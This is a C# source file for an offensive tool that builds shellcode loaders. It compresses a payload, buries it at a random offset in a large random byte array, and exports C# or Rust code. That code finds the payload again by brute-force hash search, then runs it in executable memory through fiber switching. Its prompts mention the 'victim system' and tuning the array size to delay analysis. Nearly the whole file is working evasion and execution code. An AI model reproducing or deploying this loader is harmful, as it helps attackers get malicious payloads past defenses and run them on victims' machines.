using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace HashArray
{
    internal class Program
    {
        public static string ComputeSHA512(byte[] data)
        {
            using (SHA512 shaM = new SHA512Managed())
            {
                byte[] hashValue = shaM.ComputeHash(data);
                // Convert the byte array to a hex string
                StringBuilder sb = new StringBuilder();
                foreach (byte b in hashValue)
                {
                    sb.AppendFormat("{0:x2}", b);
                }
                return sb.ToString();
            }
        }

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("[ERROR] Path to payload required");
                return;
            }

            string filePath = args[0];
            byte[] fileBytes = null;
            try
            {
                fileBytes = File.ReadAllBytes(filePath);
                Console.WriteLine($"[+] File '{filePath}' successfully read as byte array. Length: {fileBytes.Length} bytes.");
                Console.Write("[I] First bytes content: ");
                for (int i = 0; i < Math.Min(10, fileBytes.Length); i++)
                {
                    Console.Write($"0x{fileBytes[i]:X2} ");
                }
                Console.WriteLine();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Error reading file: {ex.Message}");
            }

            // Create a new random byte array
            byte[] randomBytes = CreateRandomByteArray(fileBytes);
            Console.WriteLine($"[+] New random byte array created with length {randomBytes.Length}.");

            string hash_Orig = ComputeSHA512(fileBytes);
            Console.WriteLine("[I] SHA512 hash of the payload: " + hash_Orig);

            byte[] compressedFileBytes = CompressBytes(fileBytes);
            string hashCompressed = ComputeSHA512(compressedFileBytes);
            Console.WriteLine("[I] SHA512 hash of the compressed payload: " + hashCompressed);

            // Determine a random position where the compressed payload can be copied into randomBytes
            Random rnd = new Random();
            int maxStartIndex = randomBytes.Length - compressedFileBytes.Length;
            int insertPosition = rnd.Next(0, maxStartIndex + 1);
            Console.WriteLine($"[+] Random insert position in randomBytes array: {insertPosition} (maximum allowed: {maxStartIndex})");

            // Copy the compressed payload into randomBytes at the chosen position
            Array.Copy(compressedFileBytes, 0, randomBytes, insertPosition, compressedFileBytes.Length);
            Console.WriteLine($"[+] Payload copied at position {insertPosition} into the randomBytes array.");

            // Reset random generator
            System.Threading.Thread.Sleep(1234); // Ensure seed is different (optional)
            Random rnd2 = new Random();

            Console.Write("[?] Perform a hashing test run? (y/n): ");
            var input = Console.ReadLine();
            if (input != null && input.Trim().ToLower() == "y")
            {
                FindPayloadPositionByHash(randomBytes, compressedFileBytes.Length, hash_Orig);
            }

            // Ask whether the byte array should be exported as C# code
            Console.Write("[?] Export the randomBytes array as ready to use C# code to a text file? (y/n): ");
            input = Console.ReadLine();
            if (input != null && input.Trim().ToLower() == "y")
            {
                Console.Write("[?] Please enter a filename (or press Enter for 'randomBytes_export.cs'): ");
                string fileName = Console.ReadLine();
                if (string.IsNullOrWhiteSpace(fileName))
                {
                    fileName = "randomBytes_export.cs";
                }

                WriteByteArrayAsCSharp(randomBytes, "dataarray", fileName, hash_Orig, fileBytes.Length);
                Console.WriteLine($"[I] Array saved as C# code in '{fileName}'.");
            }

            // Ask whether the byte array should be exported as Rust code
            Console.Write("[?] Export the randomBytes array as ready to use Rust code to a text file? (y/n): ");
            var input2 = Console.ReadLine();
            if (input2 != null && input2.Trim().ToLower() == "y")
            {
                Console.Write("[?] Please enter a filename (or press Enter for 'randomBytes_export.rs'): ");
                string fileName = Console.ReadLine();
                if (string.IsNullOrWhiteSpace(fileName))
                {
                    fileName = "randomBytes_export.rs";
                }

                WriteByteArrayAsRust(randomBytes, "dataarray", fileName, hash_Orig, fileBytes.Length);
                Console.WriteLine($"[I] Array saved as Rust code in '{fileName}'.");
            }
        }

        /*
        // Creates a random byte array orig version
        static byte[] CreateRandomByteArray(byte[] fileBytes)
        {
            if (fileBytes == null) throw new ArgumentNullException(nameof(fileBytes));
            Random rnd = new Random();

            int factor = rnd.Next(50, 110); // 50 to 100 inclusive
            int newLength = fileBytes.Length * factor;

            byte[] randomBytes = new byte[newLength];
            rnd.NextBytes(randomBytes);
            return randomBytes;
        }
        */

        // Alternative version with a recommended factor 
        static byte[] CreateRandomByteArray(byte[] fileBytes)
        {
            if (fileBytes == null) throw new ArgumentNullException(nameof(fileBytes));

            // ------------------------------------------------------------
            // 1. Definition of the target size (1 – 2 MB)
            // ------------------------------------------------------------
            const long minTargetSize = 1L * 1024 * 1024;   // 1 MiB
            const long maxTargetSize = 2L * 1024 * 1024;   // 2 MiB

            // we choose (1,5 MiB) als target
            long defaultTargetSize = (minTargetSize + maxTargetSize) / 2; // 1 500 KB

            int recommendedFactor = (int)Math.Max(1, Math.Round((double)defaultTargetSize / fileBytes.Length));

            int minFactor = Math.Max(1, recommendedFactor - 20); // z. B. 80 bei 100
            int maxFactor = recommendedFactor + 20;             // z. B. 120 bei 100

            Console.WriteLine($"Original size: {fileBytes.Length:N0} bytes");
            Console.WriteLine($"Recommended factor: {recommendedFactor} (≈ {recommendedFactor * fileBytes.Length:N0} bytes)");
            Console.WriteLine($"Size is depending on CPU power on the victim system. Be sure to try it out first");
            Console.WriteLine($"You can also enter other values!)");
            Console.Write("Enter multiplication factor for the payload (integer ≥ 1): ");

          
            int factor;

            while (!int.TryParse(Console.ReadLine(), out factor) || factor < 1)
            {
                Console.Write("Invalid input. Please enter an integer ≥ 1: ");
            }

            try
            {
                long newLengthLong = (long)fileBytes.Length * factor;
                if (newLengthLong > int.MaxValue)
                    throw new InvalidOperationException($"Resulting size ({newLengthLong:N0} bytes) exceeds the maximum of {int.MaxValue:N0} bytes.");
                int newLength = (int)newLengthLong;

                byte[] randomBytes = new byte[newLength];
                new Random().NextBytes(randomBytes);
                return randomBytes;
            }
            catch (OutOfMemoryException)
            {
                throw new InvalidOperationException("The requested size is too large for the available memory.");
            }
        }


        /// Dry run in C# to find the position of the payload in the random byte array
        /// Searches for the position of fileBytes inside randomBytes by random guessing and hash comparison.
        /// Outputs the number of attempts, required time and the found position.
        public static void FindPayloadPositionByHash(byte[] randomBytes, int fileBytesLength, string hashOrig)
        {
            if (randomBytes == null) throw new ArgumentNullException(nameof(randomBytes));
            if (fileBytesLength <= 0 || fileBytesLength > randomBytes.Length) throw new ArgumentOutOfRangeException(nameof(fileBytesLength));
            if (string.IsNullOrEmpty(hashOrig)) throw new ArgumentNullException(nameof(hashOrig));

            Random rnd2 = new Random();
            int maxStartIndex = randomBytes.Length - fileBytesLength;
            int attempts = 0;
            var stopwatch = System.Diagnostics.Stopwatch.StartNew();

            while (true)
            {
                int pos = rnd2.Next(0, maxStartIndex + 1);
                byte[] temp = new byte[fileBytesLength];
                Array.Copy(randomBytes, pos, temp, 0, fileBytesLength);

                // Decompress
                byte[] decompressed;
                try
                {
                    decompressed = DecompressBytes(temp);
                }
                catch
                {
                    // If not valid GZip data, continue with next attempt
                    attempts++;
                    if (attempts % 100000 == 0)
                        Console.WriteLine($"[I] {attempts} attempts performed...");
                    continue;
                }

                string hash = ComputeSHA512(decompressed);
                attempts++;

                if (hash == hashOrig)
                {
                    stopwatch.Stop();
                    double totalSeconds = stopwatch.Elapsed.TotalSeconds;
                    double calculationsPerSecond = totalSeconds > 0
                        ? (attempts) / totalSeconds
                        : 0;
                    Console.WriteLine($"[+] Correct position found: {pos}");
                    Console.WriteLine($"[I] Attempts needed: {attempts}");
                    Console.WriteLine($"[I] Time needed: {stopwatch.ElapsedMilliseconds} ms");
                    Console.WriteLine($"[I] Calculations per second (Hash and gunzip): {calculationsPerSecond:N2}");
                    // Restore original payload
                    byte[] payload = new byte[fileBytesLength];
                    Array.Copy(decompressed, 0, payload, 0, fileBytesLength);
                    Console.Write("[+] Original payload restored, first bytes are: ");
                    for (int i = 0; i < Math.Min(10, payload.Length); i++)
                    {
                        Console.Write($"0x{payload[i]:X2} ");
                    }
                    Console.WriteLine();
                    break;
                }

                if (attempts % 100000 == 0)
                {
                    Console.WriteLine($"[+] {attempts} attempts performed...");
                }
            }
        }

        // Compress a byte array with GZip
        static byte[] CompressBytes(byte[] input)
        {
            using (var ms = new MemoryStream())
            {
                using (var gzip = new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionMode.Compress, true))
                {
                    gzip.Write(input, 0, input.Length);
                }
                return ms.ToArray();
            }
        }

        // Decompress a byte array with GZip
        static byte[] DecompressBytes(byte[] input)
        {
            using (var inputMs = new MemoryStream(input))
            using (var gzip = new System.IO.Compression.GZipStream(inputMs, System.IO.Compression.CompressionMode.Decompress))
            using (var outputMs = new MemoryStream())
            {
                gzip.CopyTo(outputMs);
                return outputMs.ToArray();
            }
        }

        public static void WriteByteArrayAsRust(byte[] byteArray, string variableName, string fileName, string hashOrig, int payloadLength)
        {
            if (byteArray == null) throw new ArgumentNullException(nameof(byteArray));
            if (string.IsNullOrEmpty(variableName)) throw new ArgumentNullException(nameof(variableName));
            if (string.IsNullOrEmpty(fileName)) throw new ArgumentNullException(nameof(fileName));

            using (var writer = new StreamWriter(fileName))
            {
                // Optional: hash or metadata as comment
                writer.WriteLine($"// Original payload length: {payloadLength}");
                writer.WriteLine($"pub const FILE_BYTE_LENGTH: usize = {payloadLength};");
                if (!string.IsNullOrEmpty(hashOrig))
                    writer.WriteLine($"// Original hash: {hashOrig}");

                writer.WriteLine();
                writer.WriteLine($"pub const HASH_ORIG: &str = \"{hashOrig}\";");

                // Rust constant: pub const NAME: [u8; LEN] = [ ... ];
                writer.WriteLine($"pub const {variableName.ToUpperInvariant()}: [u8; {byteArray.Length}] = [");

                const int bytesPerLine = 16;
                for (int i = 0; i < byteArray.Length; i += bytesPerLine)
                {
                    writer.Write(" ");
                    for (int j = i; j < Math.Min(i + bytesPerLine, byteArray.Length); j++)
                    {
                        writer.Write($"0x{byteArray[j]:X2}, ");
                    }
                    writer.WriteLine();
                }

                writer.WriteLine("];");
            }
        }

        /// <summary>
        /// Writes a byte array as C# code to a file and includes the logic for position search via hash comparison.
        /// </summary>
        /// <param name="byteArray">The byte array to export</param>
        /// <param name="variableName">Variable name in the generated C# code</param>
        /// <param name="fileName">Target file name</param>
        /// <param name="hashOrig">SHA‑512 hash of the (decompressed) payload</param>
        /// <param name="payloadlength">Length of the original payload</param>
        public static void WriteByteArrayAsCSharp(byte[] byteArray, string variableName, string fileName, string hashOrig, int payloadlength)
        {
            if (byteArray == null) throw new ArgumentNullException(nameof(byteArray));
            if (string.IsNullOrEmpty(variableName)) throw new ArgumentNullException(nameof(variableName));
            if (string.IsNullOrEmpty(fileName)) throw new ArgumentNullException(nameof(fileName));

            using (var writer = new StreamWriter(fileName))
            {
                writer.WriteLine("// --- This part goes before the Main function ---");

                // Helper function for SHA512
                writer.WriteLine("static string ComputeSHA512(byte[] data)");
                writer.WriteLine("{");
                writer.WriteLine("    using (var shaM = new System.Security.Cryptography.SHA512Managed())");
                writer.WriteLine("    {");
                writer.WriteLine("        byte[] hashValue = shaM.ComputeHash(data);");
                writer.WriteLine("        var sb = new System.Text.StringBuilder();");
                writer.WriteLine("        foreach (byte b in hashValue)");
                writer.WriteLine("            sb.AppendFormat(\"{0:x2}\", b);");
                writer.WriteLine("        return sb.ToString();");
                writer.WriteLine("    }");
                writer.WriteLine("}");
                writer.WriteLine();

                // Helper function for decompression
                writer.WriteLine("static byte[] DecompressBytes(byte[] input)");
                writer.WriteLine("{");
                writer.WriteLine("    using (var inputMs = new System.IO.MemoryStream(input))");
                writer.WriteLine("    using (var gzip = new System.IO.Compression.GZipStream(inputMs, System.IO.Compression.CompressionMode.Decompress))");
                writer.WriteLine("    using (var outputMs = new System.IO.MemoryStream())");
                writer.WriteLine("    {");
                writer.WriteLine("        gzip.CopyTo(outputMs);");
                writer.WriteLine("        return outputMs.ToArray();");
                writer.WriteLine("    }");
                writer.WriteLine("}");
                writer.WriteLine();

                // Logic for position search
                writer.WriteLine("// --- This part belongs to the Main function ---");
                writer.WriteLine($"string hashOrig = \"{hashOrig}\";");
                writer.WriteLine($"int fileBytesLength = {payloadlength};");

                // Byte array as C# code (single line)
                writer.Write($"byte[] {variableName} = new byte[] {{");
                for (int i = 0; i < byteArray.Length; i++)
                {
                    writer.Write($"0x{byteArray[i]:X2}");
                    if (i < byteArray.Length - 1)
                        writer.Write(", ");
                }
                writer.WriteLine("};");

                writer.WriteLine("var rnd = new Random();");
                writer.WriteLine($"int maxStartIndex = {variableName}.Length - fileBytesLength;");
                writer.WriteLine("int attempts = 0;");
                writer.WriteLine("var stopwatch = System.Diagnostics.Stopwatch.StartNew();");
                writer.WriteLine("while (true)");
                writer.WriteLine("{");
                writer.WriteLine("    int pos = rnd.Next(0, maxStartIndex + 1);");
                writer.WriteLine("    byte[] temp = new byte[fileBytesLength];");
                writer.WriteLine($"    Array.Copy({variableName}, pos, temp, 0, fileBytesLength);");
                writer.WriteLine("    byte[] decompressed;");
                writer.WriteLine("    try");
                writer.WriteLine("    {");
                writer.WriteLine("        decompressed = DecompressBytes(temp);");
                writer.WriteLine("    }");
                writer.WriteLine("    catch");
                writer.WriteLine("    {");
                writer.WriteLine("        attempts++;");
                writer.WriteLine("        if (attempts % 100000 == 0) System.Console.WriteLine($\"{attempts} attempts performed...\");");
                writer.WriteLine("        continue;");
                writer.WriteLine("    }");
                writer.WriteLine("    string hash = ComputeSHA512(decompressed);");
                writer.WriteLine("    attempts++;");
                writer.WriteLine("    if (hash == hashOrig)");
                writer.WriteLine("    {");
                writer.WriteLine("        stopwatch.Stop();");
                writer.WriteLine("        System.Console.WriteLine($\"Correct position found: {pos}\");");
                writer.WriteLine("        System.Console.WriteLine($\"Attempts needed: {attempts}\");");
                writer.WriteLine("        System.Console.WriteLine($\"Time needed: {stopwatch.ElapsedMilliseconds} ms\");");
                writer.WriteLine("        // Extract original payload");
                writer.WriteLine("        byte[] payload = new byte[fileBytesLength];");
                writer.WriteLine("        Array.Copy(decompressed, 0, payload, 0, fileBytesLength);");
                writer.WriteLine("        System.Console.Write(\"Original payload restored, first bytes are: \");");
                writer.WriteLine("        for (int i = 0; i < Math.Min(10, payload.Length); i++)");
                writer.WriteLine("        {");
                writer.WriteLine("            System.Console.Write($\"0x{payload[i]:X2} \");");
                writer.WriteLine("        }");
                writer.WriteLine("        System.Console.WriteLine();");

                writer.WriteLine("        // 1. Convert Main Thread to Fiber");
                writer.WriteLine("        Console.WriteLine(\"Converting Main Thread to Fiber...\");");
                writer.WriteLine("        IntPtr mainFiber = ConvertThreadToFiber(IntPtr.Zero);");
                writer.WriteLine("        Console.WriteLine($\"Main Fiber address: 0x{mainFiber.ToInt64():X16}\");");
                writer.WriteLine();

                writer.WriteLine("        // 2. Allocate memory");
                writer.WriteLine("        Console.WriteLine(\"Allocating memory with PAGE_EXECUTE_READWRITE...\");");
                writer.WriteLine("        IntPtr alloc = VirtualAlloc(IntPtr.Zero, (UInt32)payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);");
                writer.WriteLine();

                writer.WriteLine("        // 3. Copy payload");
                writer.WriteLine("        Console.WriteLine($\"Copying payload to allocated memory at: 0x{alloc.ToInt64():X16}\");");
                writer.WriteLine("        Marshal.Copy(payload, 0, alloc, payload.Length);");
                writer.WriteLine();

                writer.WriteLine("        // 4. Change access rights");
                writer.WriteLine("        Console.WriteLine(\"Setting access rights to PAGE_EXECUTE_READ...\");");
                writer.WriteLine("        uint oldProtect;");
                writer.WriteLine("        VirtualProtect(alloc, (UInt32)payload.Length, PAGE_EXECUTE_READ, out oldProtect);");
                writer.WriteLine();

                writer.WriteLine("        // 5. Create Fiber and switch");
                writer.WriteLine("        Console.WriteLine(\"Creating Fiber and switching to it... Thread will hang forever /shrug\");");
                writer.WriteLine("        IntPtr newFiber = CreateFiber(IntPtr.Zero, alloc, IntPtr.Zero);");
                writer.WriteLine("        SwitchToFiber(newFiber);");
                writer.WriteLine("        break;");
                writer.WriteLine("    }");
                writer.WriteLine("    if (attempts % 100000 == 0)");
                writer.WriteLine("    {");
                writer.WriteLine("        System.Console.WriteLine($\"{attempts} attempts performed...\");");
                writer.WriteLine("    }");
                writer.WriteLine("}");
            }
        }
    }
}